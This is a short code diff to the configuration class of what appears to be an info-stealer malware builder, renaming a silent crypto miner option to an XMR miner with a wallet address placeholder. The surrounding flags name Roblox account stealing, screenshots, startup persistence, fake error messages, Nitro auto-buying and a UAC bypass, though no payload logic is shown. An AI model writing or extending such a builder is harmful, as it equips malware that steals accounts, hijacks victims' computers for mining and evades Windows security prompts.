@@ -28,8 +28,8 @@ class Config:
         self.roblox_stealing = False
         self.screenshot = False
         self.start_up = False
-        self.silent_crypto__miner = False
-        self.wallet_adress = "_WALLET_ADR_HERE"
+        self.xmr_miner = False
+        self.xmr_adress = "wallet_adressss"
         self.fake_error = False
         self.nitro_auto_buy = False
         self.uac_bypass = False
@@ -115,11 +115,11 @@ class Config:
     def get_start_up(self):
         return self.start_up
     
-    def silent_crypto_miner(self):
-        return self.silent_crypto__miner
+    def get_xmr_miner(self):
+        return self.xmr_miner
 
-    def get_wallet_adress(self):
-        return self.wallet_adress
+    def get_xmr_adress(self):
+        return self.xmr_adress
 
     def get_fake_error(self):
         return self.fake_error
